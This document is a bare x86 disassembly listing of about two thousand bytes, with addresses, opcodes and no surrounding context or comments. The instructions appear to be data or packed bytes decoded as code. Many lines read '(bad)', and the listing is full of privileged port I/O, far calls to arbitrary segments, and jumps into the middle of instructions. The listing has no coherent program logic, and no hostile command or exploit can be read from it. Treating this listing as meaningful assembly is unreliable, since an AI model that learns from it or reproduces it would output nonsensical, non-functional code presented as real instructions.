  412822:	addr16 sbb eax,0x352d13d3
  412828:	or     ecx,DWORD PTR [edx+0x43b9092f]
  41282e:	mov    WORD PTR [esi-0x57],cs
  412831:	sub    al,BYTE PTR [ecx+0x17]
  412834:	mov    ah,0xf
  412836:	and    al,0x95
  412838:	jg     0x412827
  41283a:	enter  0x64fc,0x3
  41283e:	and    cl,BYTE PTR ds:0x9597c643
  412844:	mov    ch,0x21
  412846:	and    DWORD PTR [eax+0x1a],ebx
  412849:	push   esp
  41284a:	mov    esi,0x27d378ac
  41284f:	inc    ecx
  412850:	in     al,dx
  412851:	in     eax,dx
  412852:	popf   
  412853:	mov    dl,0xf9
  412855:	scas   al,BYTE PTR es:[edi]
  412856:	call   0xf55b:0x6bcb16bd
  41285d:	fstcw  WORD PTR [ecx+0x10cf3475]
  412864:	inc    esi
  412865:	sub    BYTE PTR [edi+0x53daf035],ch
  41286b:	pop    ebx
  41286c:	aas    
  41286d:	jno    0x4128e0
  41286f:	mov    cl,0xf5
  412871:	test   eax,0x9ada5c9e
  412876:	fadd   QWORD PTR [ebx-0xa]
  412879:	lods   al,BYTE PTR ds:[esi]
  41287a:	call   0x3de7:0x2f373780
  412881:	pusha  
  412882:	sub    bh,BYTE PTR [esi+0x619d88a2]
  412888:	inc    ebp
  412889:	push   ebp
  41288a:	dec    esp
  41288b:	arpl   WORD PTR [ebp+0x29634b17],ax
  412891:	mov    ecx,0x5a038347
  412896:	in     al,0x52
  412898:	push   edx
  412899:	add    dh,al
  41289b:	push   esp
  41289c:	pop    edi
  41289d:	call   0xf27b23c7
  4128a2:	loope  0x412886
  4128a4:	out    0x4d,eax
  4128a6:	mov    DWORD PTR ds:0xa87c3dd6,ebx
  4128ac:	adc    ebp,DWORD PTR [edx+ecx*1-0x31750add]
  4128b3:	xchg   ah,cl
  4128b5:	fwait
  4128b6:	cwde   
  4128b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128b8:	mov    BYTE PTR [ebp+eiz*2+0x7aff763a],dh
  4128bf:	and    eax,0xcc7466d9
  4128c4:	mov    edi,0x37a4660
  4128c9:	mov    esi,edi
  4128cb:	adc    al,0xb4
  4128cd:	pop    ebx
  4128ce:	xchg   DWORD PTR [ebp-0x44],ecx
  4128d1:	ins    BYTE PTR es:[edi],dx
  4128d2:	inc    esi
  4128d3:	fidivr WORD PTR [edi-0x26]
  4128d6:	xor    al,ch
  4128d8:	je     0x4128b1
  4128da:	inc    edi
  4128db:	add    ecx,DWORD PTR [edx]
  4128dd:	dec    edi
  4128de:	push   eax
  4128df:	das    
  4128e0:	call   0x505011c4
  4128e5:	scas   al,BYTE PTR es:[edi]
  4128e6:	std    
  4128e7:	mov    ebp,0xc1a22a93
  4128ec:	bound  eax,QWORD PTR [ebx-0x3e]
  4128ef:	jl     0x412954
  4128f1:	retf   
  4128f2:	in     al,dx
  4128f3:	dec    ecx
  4128f4:	pop    ebp
  4128f5:	loop   0x41294a
  4128f7:	sbb    al,0x95
  4128f9:	sub    BYTE PTR [ebp-0x17],0xee
  4128fd:	or     eax,DWORD PTR [ecx-0x43]
  412900:	pop    ebx
  412901:	js     0x412953
  412903:	or     bh,BYTE PTR [edi-0x565019c5]
  412909:	mov    eax,ds:0x88331610
  41290e:	clc    
  41290f:	cli    
  412910:	mov    ah,0xa2
  412912:	sub    eax,0x27e23a40
  412917:	aas    
  412918:	or     dl,BYTE PTR [ebx+0x4a]
  41291b:	sub    eax,0x49cef1d4
  412920:	dec    esp
  412921:	jmp    0x412985
  412923:	leave  
  412924:	inc    edx
  412925:	ja     0x41293d
  412927:	addr16 pop ebp
  412929:	mov    dh,0xe5
  41292b:	xchg   esp,eax
  41292c:	jne    0x41295b
  41292e:	push   ebp
  41292f:	jecxz  0x4129a9
  412931:	mov    edx,0x6f34dfd7
  412936:	fadd   DWORD PTR [edi+0x1e]
  412939:	xor    dl,BYTE PTR [edi]
  41293b:	sar    DWORD PTR [eax+0x60],1
  41293e:	sub    DWORD PTR [edx+0x5a],ecx
  412941:	add    al,0x17
  412943:	cdq    
  412944:	dec    ebp
  412945:	adc    edx,esi
  412947:	or     al,ch
  412949:	gs sub al,0x5e
  41294c:	and    bh,bl
  41294e:	push   ebp
  41294f:	ret    0xbedd
  412952:	lea    edx,[edi-0x10]
  412955:	loopne 0x412929
  412957:	adc    al,BYTE PTR [ecx-0x41]
  41295a:	cs sahf 
  41295c:	sub    ebp,edi
  41295e:	jns    0x41296d
  412960:	mov    ah,0x5e
  412962:	or     BYTE PTR [esi-0x72],cl
  412965:	dec    ebx
  412966:	inc    edi
  412967:	push   ebx
  412968:	mov    WORD PTR [ebx],ds
  41296a:	test   BYTE PTR [edi+0x77],ch
  41296d:	cdq    
  41296e:	test   bh,cl
  412970:	jmp    0x50861762
  412975:	sub    al,0xcd
  412977:	sbb    dl,cl
  412979:	repnz jmp FWORD PTR [ebx+ecx*8+0x1f]
  41297e:	pop    eax
  41297f:	adc    esp,DWORD PTR [eax-0x34]
  412982:	add    DWORD PTR [edx+0x1661ce00],0xffffff8b
  412989:	mov    ebx,0xb4207b03
  41298e:	aas    
  41298f:	and    al,0xeb
  412991:	sub    ebp,esp
  412993:	sub    al,0x9c
  412995:	and    BYTE PTR [esi-0x297e4856],dh
  41299b:	sub    BYTE PTR [edi+0x6e],ah
  41299e:	jge    0x412978
  4129a0:	and    al,0x27
  4129a2:	mov    ds,WORD PTR [eax]
  4129a4:	xor    al,0xcd
  4129a6:	(bad)  
  4129a7:	aad    0x97
  4129a9:	mov    edx,0x977b906c
  4129ae:	outs   dx,DWORD PTR gs:[esi]
  4129b0:	and    ch,BYTE PTR [edi+ebp*8+0x67]
  4129b4:	adc    ebx,DWORD PTR [esi]
  4129b6:	es jo  0x412973
  4129b9:	addr16 dec edx
  4129bb:	stos   DWORD PTR es:[edi],eax
  4129bc:	pop    DWORD PTR [esi+0x3]
  4129bf:	push   es
  4129c0:	lods   al,BYTE PTR ds:[esi]
  4129c1:	dec    ebp
  4129c2:	push   esi
  4129c3:	jmp    0x41295b
  4129c5:	(bad)  
  4129c6:	jmp    0x6434:0x7ee396c5
  4129cd:	int3   
  4129ce:	xor    cl,BYTE PTR [esi+0x33]
  4129d1:	(bad)  
  4129d2:	mov    edi,0xe98b0dc9
  4129d7:	sbb    ah,BYTE PTR [esp+esi*2]
  4129da:	into   
  4129db:	push   esi
  4129dc:	(bad)  
  4129dd:	retf   0x4799
  4129e0:	sub    eax,0x129c4498
  4129e5:	add    DWORD PTR ds:0x2c2e3ac0,ebx
  4129eb:	inc    ecx
  4129ec:	xchg   edi,eax
  4129ed:	loopne 0x412986
  4129ef:	adc    al,0x4e
  4129f1:	pop    ss
  4129f2:	inc    esi
  4129f3:	cmp    eax,0x3115c3a3
  4129f8:	adc    DWORD PTR [edx+0xd],ebp
  4129fb:	mov    ah,0xd8
  4129fd:	out    dx,al
  4129fe:	leave  
  4129ff:	cmp    DWORD PTR [edx],edi
  412a01:	popf   
  412a02:	sub    ebp,DWORD PTR [edx+esi*4+0x4d]
  412a06:	push   ss
  412a07:	les    ebp,FWORD PTR [ebp-0x78]
  412a0a:	fisttp DWORD PTR [edi+edx*4+0x63]
  412a0e:	push   cs
  412a0f:	(bad)  
  412a10:	je     0x412a42
  412a12:	shrd   DWORD PTR [esi+ebp*8+0x72198247],esi,cl
  412a1a:	jg     0x412a17
  412a1c:	sar    BYTE PTR [edi],cl
  412a1e:	rcr    DWORD PTR [ebp+ebp*1+0x19],1
  412a22:	les    ecx,FWORD PTR [ebx]
  412a24:	mov    ch,BYTE PTR [edi+edx*4-0x1e]
  412a28:	jmp    0xa01a3957
  412a2d:	inc    esi
  412a2e:	call   0xc6141669
  412a33:	fld    DWORD PTR [edx-0x43e23956]
  412a39:	fild   DWORD PTR ds:0x550bd629
  412a3f:	(bad)
  412a42:	icebp  
  412a43:	add    BYTE PTR [esi],al
  412a45:	or     ecx,DWORD PTR [edx]
  412a47:	or     bh,BYTE PTR [esi+0x5f]
  412a4a:	out    dx,eax
  412a4b:	gs test al,0x1f
  412a4e:	add    edi,DWORD PTR [esi-0x2f]
  412a51:	jae    0x412a51
  412a53:	mov    cs,WORD PTR [ebx-0x3d968384]
  412a59:	lock test DWORD PTR [esi-0x63],edi
  412a5d:	popa   
  412a5e:	ror    BYTE PTR ds:0x412da597,1
  412a64:	and    BYTE PTR [ebx],0xdf
  412a67:	jl     0x412ac8
  412a69:	push   es
  412a6a:	in     eax,dx
  412a6b:	loopne 0x4129ed
  412a6d:	daa    
  412a6e:	mov    al,0x6a
  412a70:	in     eax,dx
  412a71:	fdiv   st(0),st
  412a73:	popa   
  412a74:	into   
  412a75:	mov    eax,ds:0x898e8b4e
  412a7a:	or     DWORD PTR [ecx+0x3c9ad593],0x45cc157d
  412a84:	mov    eax,0xf847ac7f
  412a89:	mov    cl,0xf8
  412a8b:	mov    eax,0x51e7c345
  412a90:	or     ebx,DWORD PTR [eax+0x4aff671b]
  412a96:	out    dx,eax
  412a97:	add    esi,DWORD PTR [edi+0x18ddf825]
  412a9d:	inc    eax
  412a9e:	jecxz  0x412a89
  412aa0:	inc    esi
  412aa1:	rol    DWORD PTR [eax],cl
  412aa3:	pop    esp
  412aa4:	into   
  412aa5:	mov    ah,0x14
  412aa7:	mov    WORD PTR [eax+0x7c],es
  412aaa:	mov    cl,0x6b
  412aac:	aas    
  412aad:	mov    ds:0xca42e58c,al
  412ab2:	xor    DWORD PTR [ecx+0x6459ad3e],eax
  412ab8:	(bad)  
  412ab9:	call   0x8912:0xea69eb1d
  412ac0:	cmp    al,0x7e
  412ac2:	repz push ds
  412ac4:	add    DWORD PTR [ebp-0x4d],esp
  412ac7:	(bad)  
  412ac8:	adc    BYTE PTR [esp+esi*2+0x55883ca7],al
  412acf:	ds inc esp
  412ad1:	and    edx,esi
  412ad3:	or     cl,BYTE PTR [edi]
  412ad5:	int    0x34
  412ad7:	or     al,0x9d
  412ad9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ada:	outs   dx,DWORD PTR ds:[esi]
  412adb:	pop    eax
  412adc:	mov    al,0xe2
  412ade:	and    ebx,DWORD PTR [ecx-0x4f]
  412ae1:	out    0xcb,al
  412ae3:	push   edx
  412ae4:	jae    0x412aec
  412ae6:	popf   
  412ae7:	jg     0x412b1a
  412ae9:	mov    eax,ds:0x5a3a14f6
  412aee:	imul   esi,ebx,0x64382161
  412af4:	mov    edx,0xc120633f
  412af9:	jne    0x412b09
  412afb:	imul   ecx,esp,0x16
  412afe:	or     BYTE PTR [edx+0x76],cl
  412b01:	cwde   
  412b02:	pop    DWORD PTR [ecx+0x72764f10]
  412b08:	adc    esi,0x26
  412b0b:	cs and eax,0xdef9b30e
  412b11:	add    al,0x8f
  412b13:	gs push edi
  412b15:	xor    al,0x7c
  412b17:	and    ch,BYTE PTR [esi]
  412b19:	dec    BYTE PTR [eax+0x3]
  412b1c:	ror    DWORD PTR [eax],cl
  412b1e:	scas   eax,DWORD PTR es:[edi]
  412b1f:	mov    dl,0xab
  412b21:	mov    DWORD PTR [edx+0x6d],eax
  412b24:	(bad)  
  412b25:	not    DWORD PTR [ebp+esi*2+0x9]
  412b29:	xchg   BYTE PTR [ebx+0x78],bl
  412b2c:	pop    ds
  412b2d:	test   al,0x9c
  412b2f:	jg     0x412b31
  412b31:	(bad)  
  412b33:	test   DWORD PTR [ecx-0x19],eax
  412b36:	mov    bl,0x36
  412b38:	call   0x210f:0x42fe64a9
  412b3f:	and    al,0x41
  412b41:	or     eax,0xbe7e5c6f
  412b46:	pop    es
  412b47:	pop    ebp
  412b48:	dec    ebx
  412b49:	lea    esi,[esi]
  412b4b:	or     eax,0x6cd002
  412b50:	dec    edi
  412b51:	and    al,0x2
  412b53:	les    ecx,FWORD PTR [edx+0x6]
  412b56:	mov    ah,0x37
  412b58:	and    al,0xe5
  412b5a:	jge    0x412b5f
  412b5c:	add    BYTE PTR [esp+ecx*1-0x79],al
  412b60:	int    0xd9
  412b62:	or     al,0x7b
  412b64:	std    
  412b65:	aaa    
  412b66:	ins    DWORD PTR es:[edi],dx
  412b67:	cwde   
  412b68:	aas    
  412b69:	sti    
  412b6a:	js     0x412b55
  412b6c:	popa   
  412b6d:	loope  0x412b12
  412b6f:	adc    esi,DWORD PTR [ebx-0x669e5e85]
  412b75:	jns    0x412be2
  412b77:	sub    dh,bl
  412b79:	mov    eax,ds:0x8a4445ef
  412b7e:	rcl    DWORD PTR [ecx+0x6a],1
  412b81:	mov    al,0x2f
  412b83:	(bad)  
  412b84:	sbb    BYTE PTR [edx-0xe],ch
  412b87:	ss je  0x412b23
  412b8a:	pop    esp
  412b8b:	mov    ebx,0x369464fd
  412b90:	test   ch,cl
  412b92:	mov    ecx,0xecdcc065
  412b97:	and    DWORD PTR [edi],0xffffff91
  412b9a:	cmp    edi,ecx
  412b9c:	adc    dl,dh
  412b9e:	fdivr  QWORD PTR [eax+0x73e4b91a]
  412ba4:	rcl    DWORD PTR [ebp+ebp*1-0x2f],0x15
  412ba9:	mov    eax,0xad4baa7f
  412bae:	test   BYTE PTR [eax],ah
  412bb0:	test   DWORD PTR [esi-0x9],0x4b37c8aa
  412bb7:	inc    ebp
  412bb8:	call   0x202e1d3
  412bbd:	sub    ecx,DWORD PTR [edi]
  412bbf:	je     0x412ba5
  412bc1:	cdq    
  412bc2:	in     al,0x48
  412bc4:	cmp    edx,DWORD PTR [ebp+ebx*2-0x4966451]
  412bcb:	loopne 0x412bba
  412bcd:	dec    esp
  412bce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412bcf:	or     DWORD PTR [edi-0x6c],0xffffffd1
  412bd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412bd4:	xchg   ecx,eax
  412bd5:	and    eax,eax
  412bd7:	push   esp
  412bd8:	repnz in eax,dx
  412bda:	repz shl BYTE PTR [eax+0x66],cl
  412bde:	scas   eax,DWORD PTR es:[edi]
  412bdf:	adc    BYTE PTR [ebx+eiz*1],al
  412be2:	lods   al,BYTE PTR ds:[esi]
  412be3:	pop    ebx
  412be4:	imul   ebp,esi,0x796f934f
  412bea:	jb     0x412c09
  412bec:	mov    esi,0xc4772d55
  412bf1:	in     eax,0x72
  412bf3:	xor    ebp,ecx
  412bf5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412bf6:	in     eax,dx
  412bf7:	cmp    BYTE PTR cs:[eax-0x22],dh
  412bfb:	(bad)  
  412bfc:	rcr    DWORD PTR [edx+eiz*4],0xf9
  412c00:	fadd   QWORD PTR [eax+0x20]
  412c03:	xchg   esp,eax
  412c04:	test   BYTE PTR [ebx+0x75],dh
  412c07:	fwait
  412c08:	call   0x8b80909f
  412c0d:	xchg   bh,al
  412c0f:	mov    eax,0xe7cb484
  412c14:	test   DWORD PTR [ebx],esi
  412c16:	ret    
  412c17:	leave  
  412c18:	sbb    DWORD PTR [eax+0x7b],esp
  412c1b:	int    0x62
  412c1d:	xchg   bl,dh
  412c1f:	jmp    0x412bb7
  412c21:	jl     0x412c28
  412c23:	inc    ebp
  412c24:	jnp    0x412c1c
  412c26:	nop/reserved BYTE PTR [edi-0x7f18a3ae]
  412c2d:	popf   
  412c2e:	ror    BYTE PTR es:[esi-0x65],cl
  412c32:	lahf   
  412c33:	ror    DWORD PTR [esi-0x5f],1
  412c36:	mov    WORD PTR [ecx],cs
  412c38:	test   DWORD PTR [ecx-0x504ea723],ebx
  412c3e:	lock loopne 0x412c5d
  412c41:	mov    ecx,0x111ee86
  412c46:	push   DWORD PTR [ebx+0x25]
  412c49:	jnp    0x412c83
  412c4b:	or     dl,BYTE PTR [esi+0x5e913437]
  412c51:	imul   ch
  412c53:	xor    al,bh
  412c55:	rol    BYTE PTR [edi],1
  412c57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c58:	stc    
  412c59:	push   edi
  412c5a:	pop    ecx
  412c5b:	call   0x29fe:0x7ebb9307
  412c62:	pop    es
  412c63:	sub    dh,cl
  412c65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c66:	dec    ebx
  412c67:	ror    DWORD PTR [ecx+0x75],0xdb
  412c6b:	jne    0x412cb3
  412c6d:	sbb    eax,0x9d4c1a57
  412c72:	push   cs
  412c73:	push   ds
  412c74:	xor    ch,BYTE PTR [ebx-0x57c0935f]
  412c7a:	jnp    0x412c07
  412c7c:	scas   eax,DWORD PTR es:[edi]
  412c7d:	test   esi,ebp
  412c7f:	in     al,dx
  412c80:	push   edi
  412c81:	cdq    
  412c82:	mov    edx,0x4d9e67cf
  412c87:	nop
  412c88:	(bad)  
  412c89:	dec    edi
  412c8a:	arpl   WORD PTR [ebx],di
  412c8c:	inc    eax
  412c8d:	and    edi,DWORD PTR [ebp-0x47]
  412c90:	lods   eax,DWORD PTR ds:[esi]
  412c91:	in     eax,0x8b
  412c93:	adc    edi,DWORD PTR [eax-0x7b]
  412c96:	addr16 mov dl,0xb
  412c99:	shl    DWORD PTR [ecx],0x13
  412c9c:	retf   
  412c9d:	mov    ebp,DWORD PTR [ebx+0x14]
  412ca0:	mov    ecx,0x148a7519
  412ca5:	sub    BYTE PTR [ebx+0x62],0xd0
  412ca9:	mov    ecx,0xc5ce30e8
  412cae:	dec    ebp
  412caf:	sahf   
  412cb0:	jb     0x412c44
  412cb2:	cdq    
  412cb3:	add    DWORD PTR [ecx-0x26],0x7
  412cb7:	ins    DWORD PTR es:[edi],dx
  412cb8:	leave  
  412cb9:	sub    ebx,DWORD PTR cs:[ecx+0x21]
  412cbd:	mov    ebp,0xe94828ab
  412cc2:	sbb    cl,BYTE PTR [edx+edx*4+0x65]
  412cc6:	mov    ebp,0xfdc620f
  412ccb:	pop    ds
  412ccc:	cmp    BYTE PTR [esi-0x2d355fd6],0xdf
  412cd3:	cmp    BYTE PTR [ecx],ah
  412cd5:	xor    eax,0x833576db
  412cda:	shr    DWORD PTR ds:0xd3ad0f35,0x36
  412ce1:	push   ebx
  412ce2:	lods   eax,DWORD PTR ds:[esi]
  412ce3:	dec    edx
  412ce4:	or     eax,0x91d0198e
  412ce9:	mov    dl,0x66
  412ceb:	sub    DWORD PTR [ebx],esi
  412ced:	xchg   esi,eax
  412cee:	(bad)  
  412cef:	mov    ch,dh
  412cf1:	div    BYTE PTR [ecx+0x69b86ee8]
  412cf7:	mov    eax,0xcd5e40b9
  412cfc:	fsub   st(5),st
  412cfe:	sub    ebp,DWORD PTR [esi-0x43]
  412d01:	pusha  
  412d02:	push   ds
  412d03:	jg     0x412c85
  412d05:	add    al,0x61
  412d07:	or     BYTE PTR [eax+edi*4+0x989909d],cl
  412d0e:	clc    
  412d0f:	xchg   edi,eax
  412d10:	scas   eax,DWORD PTR es:[edi]
  412d11:	and    DWORD PTR [ebp+0x27],eax
  412d14:	jge    0x412d49
  412d16:	xor    al,0x73
  412d18:	dec    ebp
  412d19:	ffree  st(1)
  412d1b:	inc    ebx
  412d1c:	xchg   edx,eax
  412d1d:	cdq    
  412d1e:	adc    eax,0x45d80795
  412d23:	and    eax,0x5b54eb7c
  412d28:	loop   0x412cfa
  412d2a:	sbb    eax,0x9eb73fa0
  412d2f:	je     0x412d59
  412d31:	adc    BYTE PTR [ebp*4+0x355ee4a1],cl
  412d38:	out    0xab,al
  412d3a:	shr    BYTE PTR [edx-0x40e806a3],1
  412d40:	dec    ebp
  412d41:	std    
  412d42:	or     ebp,eax
  412d44:	add    DWORD PTR gs:[edx-0x58],ebp
  412d48:	or     dh,BYTE PTR [esi+ecx*1-0x6fe908b2]
  412d4f:	rcr    DWORD PTR [esi+eax*8-0x60],1
  412d53:	popa   
  412d54:	cmp    cl,dh
  412d56:	push   esp
  412d57:	or     eax,0x8040870a
  412d5c:	loopne 0x412ce4
  412d5e:	pusha  
  412d5f:	sar    BYTE PTR [ebx],0x62
  412d62:	add    al,0x5e
  412d64:	mov    ?,WORD PTR [edi]
  412d66:	loop   0x412d4f
  412d68:	mov    ah,0x9c
  412d6a:	inc    esp
  412d6b:	adc    DWORD PTR [esi-0x6e2de812],0x8bb88ace
  412d75:	xchg   DWORD PTR [ecx],ecx
  412d77:	in     al,dx
  412d78:	jp     0x412d73
  412d7a:	mov    al,0x70
  412d7c:	cmp    dh,BYTE PTR [eax+0x13f87575]
  412d82:	jl     0x412d8e
  412d84:	or     DWORD PTR [eax+0x58f33a6a],ecx
  412d8a:	push   edx
  412d8b:	mov    ebx,0x19a9d10d
  412d90:	add    ah,ch
  412d92:	ins    BYTE PTR es:[edi],dx
  412d93:	out    0xec,al
  412d95:	jbe    0x412d93
  412d97:	sbb    ah,BYTE PTR [eax-0x48]
  412d9a:	fldenv [esi+0x7a]
  412d9d:	rcl    BYTE PTR ds:0x74949be0,cl
  412da3:	mov    ah,0xa6
  412da5:	inc    ebp
  412da6:	popa   
  412da7:	lea    edx,[esi-0x353507cb]
  412dad:	or     BYTE PTR [eax],0x2a
  412db0:	fadd   QWORD PTR [ecx+ebx*4-0x6c]
  412db4:	sub    edx,edi
  412db6:	sub    eax,DWORD PTR [esi]
  412db8:	lahf   
  412db9:	sbb    dl,0x91
  412dbc:	daa    
  412dbd:	arpl   di,ax
  412dbf:	int    0xc5
  412dc1:	mov    ch,0x31
  412dc3:	jae    0x412d88
  412dc5:	mov    WORD PTR [esi+0x5c],?
  412dc8:	sbb    dl,BYTE PTR [edx+0x19]
  412dcb:	jo     0x412e0a
  412dcd:	imul   edx,esp,0xa250b8fe
  412dd3:	or     bh,BYTE PTR [eax]
  412dd5:	aad    0x22
  412dd7:	jp     0x412db1
  412dd9:	pop    eax
  412dda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ddb:	xor    DWORD PTR [esi+0x23],edi
  412dde:	dec    eax
  412ddf:	and    al,0x87
  412de1:	add    DWORD PTR [edx-0x296ca578],edi
  412de7:	xchg   esp,eax
  412de8:	mov    BYTE PTR [edx+0x2ed0960d],bl
  412dee:	sbb    al,0xc3
  412df0:	scas   eax,DWORD PTR es:[edi]
  412df1:	mov    al,0xed
  412df3:	inc    edi
  412df4:	or     eax,0x51edeb3d
  412df9:	ja     0x412de9
  412dfb:	dec    ebx
  412dfc:	cmp    BYTE PTR [eax+edx*4],ch
  412dff:	(bad)  
  412e00:	xchg   ecx,eax
  412e01:	jg     0x412e40
  412e03:	sub    dl,ah
  412e05:	mov    bl,0xd0
  412e07:	push   es
  412e08:	or     BYTE PTR ds:0xc76ea7e6,dl
  412e0e:	push   edi
  412e0f:	jl     0x412e3b
  412e11:	sub    eax,0x4752df6b
  412e16:	or     eax,0x621e1bb6
  412e1b:	xchg   ecx,eax
  412e1c:	fmul   st(6),st
  412e1e:	push   esp
  412e1f:	lods   al,BYTE PTR ds:[esi]
  412e20:	mov    cl,0xee
  412e22:	sub    DWORD PTR [ebx+ebp*2-0xa],0xa5c9e1d0
  412e2a:	lods   al,BYTE PTR ds:[esi]
  412e2b:	jecxz  0x412dec
  412e2d:	fcmovnb st,st(6)
  412e2f:	iret   
  412e30:	push   esi
  412e31:	inc    eax
  412e32:	bound  esi,QWORD PTR [ebp+0x9]
  412e35:	xor    ah,BYTE PTR [eax-0x51]
  412e38:	call   0x905a:0x19b8dd2a
  412e3f:	call   0x70f3:0x97e6e573
  412e46:	aas    
  412e47:	addr16 ret 0x9c55
  412e4b:	jb     0x412eb6
  412e4d:	ret    
  412e4e:	stc    
  412e4f:	xchg   edi,eax
  412e50:	hlt    
  412e51:	js     0x412e97
  412e53:	sbb    edi,edx
  412e55:	cli    
  412e56:	pop    ecx
  412e57:	retf   
  412e58:	dec    edi
  412e59:	pop    esp
  412e5a:	iret   
  412e5b:	sahf   
  412e5c:	xor    dh,BYTE PTR [edx]
  412e5e:	ds es pusha 
  412e61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e62:	mov    al,0x51
  412e64:	jbe    0x412e49
  412e66:	ror    BYTE PTR [esi-0x389e5eb8],cl
  412e6c:	lahf   
  412e6d:	ds (bad) 
  412e6f:	call   0xce:0xdb8b3dee
  412e76:	cld    
  412e77:	push   0x710c5eb8
  412e7c:	popf   
  412e7d:	fsub   QWORD PTR [ebp-0x6df2f0ce]
  412e83:	mov    edi,0x324ccb9
  412e88:	loop   0x412e93
  412e8a:	mov    ds:0xe1ed38b,al
  412e8f:	or     DWORD PTR [eax+0x3b],ecx
  412e92:	adc    DWORD PTR [edi-0x6c],esi
  412e95:	mov    cl,0xd4
  412e97:	aaa    
  412e98:	cmc    
  412e99:	js     0x412ef9
  412e9b:	les    edi,FWORD PTR [eax]
  412e9d:	fstp   QWORD PTR ds:0x54fe5ec8
  412ea3:	jo     0x412e7d
  412ea5:	shl    DWORD PTR fs:[edx-0x24bde6f],cl
  412eac:	aas    
  412ead:	push   edi
  412eae:	push   ebx
  412eaf:	adc    al,0x80
  412eb1:	xor    esp,ebx
  412eb3:	jmp    0x3d82:0x41dbf2d0
  412eba:	xchg   esp,eax
  412ebb:	mov    eax,gs
  412ebd:	out    dx,al
  412ebe:	sub    DWORD PTR [eax+0x2e0a7246],ecx
  412ec4:	xchg   DWORD PTR [edx-0x5c6f786b],ebx
  412eca:	mov    bl,0x66
  412ecc:	push   ebp
  412ecd:	xchg   BYTE PTR [eax-0x561c7503],cl
  412ed3:	ror    DWORD PTR [esi+0x1c18131],0xac
  412eda:	sbb    al,0xc2
  412edc:	add    BYTE PTR gs:[ecx+eiz*1-0x5a],al
  412ee1:	cmp    edx,eax
  412ee3:	(bad)  
  412ee4:	div    BYTE PTR [esi-0x354c86b9]
  412eea:	sub    al,BYTE PTR [ecx+0x44051b23]
  412ef0:	pop    es
  412ef1:	mov    ds:0xaf9e328b,al
  412ef6:	fs mov ecx,0x8be49298
  412efc:	push   es
  412efd:	jmp    0xf42d:0xf4985d90
  412f04:	std    
  412f05:	dec    esp
  412f06:	xchg   ebp,eax
  412f07:	dec    ecx
  412f08:	sbb    al,0x59
  412f0a:	mov    ebp,0x64fd7922
  412f0f:	fadd   DWORD PTR [ebp+esi*8+0x6f]
  412f13:	je     0x412f62
  412f15:	imul   ebx,DWORD PTR [edi+0x5dde5b37],0x36
  412f1c:	mov    DWORD PTR ss:[ebp+0x18],0xbdce72bb
  412f24:	inc    esp
  412f25:	push   esp
  412f26:	repz iret 
  412f28:	cdq    
  412f29:	xchg   ecx,eax
  412f2a:	ret    0x6dad
  412f2d:	or     dh,BYTE PTR [edx+0x5adbbf55]
  412f33:	xor    al,0xec
  412f35:	dec    edx
  412f36:	ds xor ecx,edx
  412f39:	fst    DWORD PTR [edi+edi*2+0x3c2e0b06]
  412f40:	and    BYTE PTR [edi-0x44eb63b8],0x90
  412f47:	mov    al,0x14
  412f49:	sbb    BYTE PTR [ebx+0x50],al
  412f4c:	(bad)  
  412f4d:	nop
  412f4e:	xlat   BYTE PTR ds:[ebx]
  412f4f:	test   bh,cl
  412f51:	push   ecx
  412f52:	sbb    eax,DWORD PTR [eax]
  412f54:	retf   
  412f55:	sbb    eax,0x6b10166c
  412f5a:	mov    ebp,0x568b5d82
  412f5f:	hlt    
  412f60:	dec    edx
  412f61:	pop    ecx
  412f62:	cmp    DWORD PTR [ebp+0x3d2ed946],0xf814b7ed
  412f6c:	pop    eax
  412f6d:	jo     0x412fda
  412f6f:	dec    eax
  412f70:	lahf   
  412f71:	mov    ch,0xf6
  412f73:	js     0x412fa7
  412f75:	iret   
  412f76:	push   ss
  412f77:	popf   
  412f78:	test   BYTE PTR [ebx],al
  412f7a:	push   es
  412f7b:	jns    0x412f6c
  412f7d:	xchg   esi,eax
  412f7e:	sub    edi,ecx
  412f80:	xchg   edi,eax
  412f81:	pop    ss
  412f82:	pop    esi
  412f83:	retf   0xa1c1
  412f86:	jmp    0xd283:0x3a7e8311
  412f8d:	mov    edi,0xddba8904
  412f92:	adc    al,0x4a
  412f94:	pop    edi
  412f95:	and    ah,ah
  412f97:	scas   eax,DWORD PTR es:[edi]
  412f98:	mov    edi,0xaf34dbea
  412f9d:	cmp    ebx,edi
  412f9f:	retf   
  412fa0:	mov    al,ds:0x371d48b5
  412fa5:	loop   0x412ff6
  412fa7:	mov    eax,ds:0x840a4cc
  412fac:	dec    ebx
  412fad:	out    0x44,al
  412faf:	pusha  
  412fb0:	scas   eax,DWORD PTR es:[edi]
  412fb1:	mov    ebp,0x2092636e
  412fb6:	ds sub ebx,esi
  412fb9:	stos   DWORD PTR es:[edi],eax
  412fba:	cmp    al,0xf0
  412fbc:	sbb    al,0x5d
  412fbe:	int    0xc
  412fc0:	mov    esp,0x5f5d1f2d
  412fc5:	inc    ebp
  412fc6:	lds    esp,FWORD PTR [edx+0x1e534707]
  412fcc:	inc    edi
  412fcd:	jp     0x412fbb
  412fcf:	sbb    bl,BYTE PTR [ebx-0x143e5dbe]
  412fd5:	cwde   
  412fd6:	test   DWORD PTR [esi],edi
  412fd8:	inc    ecx
  412fd9:	cwde   
  412fda:	push   ss
  412fdb:	je     0x412f71
  412fdd:	mov    ah,0x8b
  412fdf:	jns    0x41302c
  412fe1:	pusha  
  412fe2:	xchg   ecx,eax
  412fe3:	scas   eax,DWORD PTR es:[edi]
  412fe4:	test   BYTE PTR [ebp-0x39],bl
  412fe7:	push   ecx
  412fe8:	or     BYTE PTR ds:0x46f07a81,bh
  412fee:	pop    edi
  412fef:	adc    ah,al
  412ff1:	adc    ebx,DWORD PTR [eax]
  412ff3:	test   BYTE PTR [esi],bl
  412ff5:	out    0xae,al
  412ff7:	jo     0x412f88
  412ff9:	bound  ebp,QWORD PTR [esi]
  412ffb:	cvtps2pi mm3,xmm0
  412ffe:	sbb    DWORD PTR [eax],0xc2ad417f
